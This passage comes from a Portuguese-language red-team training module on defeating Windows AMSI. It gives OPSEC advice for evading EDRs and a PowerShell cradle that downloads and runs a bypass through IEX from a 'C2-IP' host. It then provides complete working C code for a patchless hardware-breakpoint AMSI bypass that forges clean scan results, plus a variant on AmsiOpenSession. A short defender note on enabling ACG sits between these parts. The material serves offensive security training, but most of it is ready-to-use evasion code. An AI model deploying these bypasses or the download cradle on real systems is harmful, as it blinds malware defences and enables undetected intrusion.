- Chamadas a `VirtualProtect` seguidas de escrita em endereços de módulos do sistema
- Modificação de bytes nos primeiros bytes de funções de amsi.dll (monitorado por EDRs)
- Uso de reflection para acessar campos internos do namespace `System.Management.Automation`

**Detecção comportamental:**
- EDRs como CrowdStrike e SentinelOne monitoram modificações de memória em regiões de código de módulos do sistema (não apenas assinaturas estáticas)
- Scripts PowerShell que tentam acessar `AmsiUtils` via reflection são frequentemente alertados mesmo quando ofuscados

### OPSEC para Bypass de AMSI

**Estratégia recomendada para operações:**

```
1. Testar bypass em VM de laboratório antes do engajamento
2. Usar ofuscação do bypass em múltiplas camadas:
   - Codificar o bypass em Base64
   - Enviar via IEX a partir de URL em memória (sem toque em disco)
   - Nunca usar as strings literais "AMSI", "AmsiScanBuffer" no script entregue
3. Priorizar loaders C# com AMSI patching embutido (mais difícil de detectar que PS puro)
4. Após bypass: usar ferramentas em memória (.NET assemblies) em vez de scripts PS
5. Considerar usar Cobalt Strike com execute-assembly — o CS já implementa AMSI bypass
   antes de carregar assemblies .NET
```

**Técnica de entrega discreta:**

```powershell
# Entregar bypass via IEX sem escrever no disco
# URL deve estar sob controle do operador
$u = 'http' + '://' + 'C2-IP/bypass.ps1'
$wc = New-Object Net.WebClient
$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
IEX $wc.DownloadString($u)

# Ou via download com proxy (pode ajudar a evadir proxies corporativos)
$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
```

**O bypass mais stealth atualmente (2024-2025) — via hardware breakpoints:**

Técnicas avançadas que não envolvem modificação de bytes de amsi.dll mas usam hardware breakpoints (debug registers) para redirecionar a execução. Não geram eventos de VirtualProtect e são mais difíceis de detectar por EDRs. Este tópico está documentado em pesquisas como "AMSI bypass via hardware breakpoints" (MDSec, 2022).

---

---

## ACG — Arbitrary Code Guard

ACG é a mitigação que **diretamente bloqueia** a técnica de patch de AMSI/ETW (via VirtualProtect + escrever bytes).

### O que ACG Bloqueia

Processo com ACG **não pode**:
- Criar novas páginas executáveis (`VirtualAlloc` com `PAGE_EXECUTE_*`)
- Modificar permissões de páginas existentes para executável (`VirtualProtect` adicionando exec)
- Mapear arquivos executáveis em novas seções

**O bloqueio é no kernel** — não é apenas uma verificação de API. Qualquer tentativa falha com `ERROR_ACCESS_DENIED`.

### Impacto nos Bypasses de AMSI

| Bypass | Com ACG |
|--------|---------|
| Patch de `AmsiScanBuffer` via `VirtualProtect` | **BLOQUEADO** |
| Patch de `EtwEventWrite` via `VirtualProtect` | **BLOQUEADO** |
| Shellcode alocado via `VirtualAlloc(PAGE_EXECUTE_READWRITE)` | **BLOQUEADO** |
| Hardware breakpoint bypass (não modifica páginas) | Funciona |
| Reflection-based bypass sem exec pages | Funciona |

### Ativar ACG (como defensor)

```c
PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dp = {0};
dp.ProhibitDynamicCode = 1;
SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &dp, sizeof(dp));
```

```powershell
# Verificar se processo tem ACG
Get-ProcessMitigation -Id (Get-Process msedge).Id | Select DynamicCode
# DynamicCode.ProhibitDynamicCode = ON → ACG ativo
```

### Workaround para JIT Engines

Engines JIT (Chromium, JavaScript V8) precisam de ACG desabilitado para compilar código. Solução usada em produção: **renderer separado** sem ACG que compila o JIT code e injeta no processo principal via mmap read-only → exec handshake (sem precisar de exec+write simultâneo).

### Por que ACG Importa para Red Team

- Processos navegadores modernos (Edge, Chrome) rodando com ACG → payload injection clássica falha
- Precisar de técnicas que não alocam páginas exec: shellcode via heaven's gate, ROP, execute-via-module-stomping
- ACG + DEP permanente + CFG = stack de mitigações que elimina payloads tradicionais

---

## Bypass via Hardware Breakpoints (HBP) — Patchless

**Por que HBP é superior ao byte patching**:
- **Patchless**: AMSI.dll permanece **idêntica** a cópia no disco. PE-sieve/Moneta/Defender memory scan não detecta diferença.
- **No CFG/CIG trigger**: não modifica páginas executáveis em DLL assinada (CIG bloqueia).
- **Thread-local**: afeta só thread atual; outras threads do processo continuam scanning normal.

### Mecânica HBP

CPU x64 tem **4 debug registers** (DR0-DR3) que disparam exceção quando endereço configurado é **acessado/executado/escrito**. Controlado via DR7 (enable flags + tipo: execute/write/read).

Quando trigger dispara, CPU gera `EXCEPTION_SINGLE_STEP`. Se VEH (Vectored Exception Handler) registrado, handler recebe `CONTEXT` da thread → pode modificar `RIP`, valores de registro, e continuar execução.

### Estratégia AMSI Bypass HBP

1. Registrar VEH custom.
2. Setar DR0 = endereço de `AmsiScanBuffer` (ou `AmsiScanString`).
3. Setar DR7 = enable DR0 com tipo "execute".
4. Quando PowerShell chama `AmsiScanBuffer`, CPU trigger `EXCEPTION_SINGLE_STEP` antes da função executar.
5. VEH manipula `CONTEXT`:
   - `Rax = AMSI_RESULT_CLEAN (0)` — return value "limpo".
   - `Rip = return address` (lê de `[Rsp]`) — pula corpo da função.
   - `Rsp += 8` — limpa stack.
6. `EXCEPTION_CONTINUE_EXECUTION` — CPU retoma execução do "RET" forjado.

Resultado: AmsiScanBuffer **nunca executa** corpo da função. Retorna 0 (limpo) sem tocar buffer.

### Código

```c
#include <windows.h>

LONG WINAPI AmsiHbpHandler(PEXCEPTION_POINTERS pInfo) {
    if (pInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT pCtx = pInfo->ContextRecord;

    // Endereço de AmsiScanBuffer (alvo da HBP)
    static FARPROC pAmsiScan = NULL;
    if (!pAmsiScan)
        pAmsiScan = GetProcAddress(GetModuleHandleA("amsi"), "AmsiScanBuffer");

    if (pCtx->Rip != (DWORD64)pAmsiScan)
        return EXCEPTION_CONTINUE_SEARCH;

    // Forjar retorno limpo:
    // - Quinto parâmetro (AMSI_RESULT*) precisa ser setado para AMSI_RESULT_CLEAN
    //   Em x64 fastcall: 5º arg em [RSP+0x28] (após home space + return addr)
    DWORD* pResult = (DWORD*)*(DWORD64*)(pCtx->Rsp + 0x28);
    if (pResult) *pResult = 0; // AMSI_RESULT_CLEAN

    // HRESULT (RAX) = S_OK
    pCtx->Rax = 0;

    // Saltar prologue: pop return address from stack, set RIP
    pCtx->Rip = *(DWORD64*)pCtx->Rsp;
    pCtx->Rsp += 8;

    return EXCEPTION_CONTINUE_EXECUTION;
}

BOOL InstallAmsiHbp() {
    // Forçar load do amsi.dll
    LoadLibraryA("amsi.dll");
    FARPROC pTarget = GetProcAddress(GetModuleHandleA("amsi"), "AmsiScanBuffer");

    // Registrar VEH antes de configurar registros
    AddVectoredExceptionHandler(1, AmsiHbpHandler);

    // Setar DR0 + DR7 na thread atual
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(GetCurrentThread(), &ctx)) return FALSE;

    ctx.Dr0 = (DWORD64)pTarget;

    // DR7 bits: L0=1 (DR0 local enable), LEN0=00 (1 byte), RW0=00 (execute)
    ctx.Dr7 = 0x1;  // 0b0001 = só L0 enable, execute mode

    return SetThreadContext(GetCurrentThread(), &ctx);
}
```

### Limitações HBP AMSI Bypass

- **Thread-scoped**: bypass só vale na thread que setou DR0. PowerShell pode usar threads worker → cada uma precisa do hook (instalar via `NtSetInformationThread` em todas).
- **DR7 sobrescritura**: outras libs (debugger, anti-cheat) podem zerar DR7 → bypass quebra.
- **NtSetThreadContext detectável**: alguns EDRs hookam essa API; usar syscall direto.

### Variante — HBP em `AmsiOpenSession`

Em vez de patchar `AmsiScanBuffer`, fazer HBP em `AmsiOpenSession` e retornar erro (E_FAIL). Sem sessão, PowerShell pula chamadas a `AmsiScanBuffer` automaticamente.

```c
// HBP em AmsiOpenSession → forçar retorno != S_OK
pCtx->Rax = 0x80004005;  // E_FAIL
pCtx->Rip = *(DWORD64*)pCtx->Rsp;
pCtx->Rsp += 8;
```

Mais elegante: AMSI inteira fica disabled para a sessão da thread sem patch visível.

---

## Módulos Relacionados

`01_av_evasao_introducao.md` cobre fundamentos AV e ThreatCheck. `02_av_evasao_avancada.md` lida com obfuscação de shellcode, loaders C/C#, Freeze, Donut. `04_applocker_bypass.md` é necessário quando PS é bloqueado por política. MITRE ATT&CK: T1562.001 (Disable or Modify Tools), T1059.001 (PowerShell).

---

## Leitura Complementar

- Microsoft AMSI documentation — https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
- RastaMouse AMSI research — https://rastamouse.me/tag/amsi/
- CRTO I — AMSI Bypass + PowerShell tradecraft
- CRTO II — Defense Evasion (EDR evasion complementar)
- OSEP (PEN-300) — AMSI Bypass
- S3cur3Th1sSh1t AMSI bypass compilation: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
- MDSec hardware breakpoint bypass: https://www.mdsec.co.uk/2022/09/
- ThreatCheck para testar bypasses: https://github.com/rasta-mouse/ThreatCheck
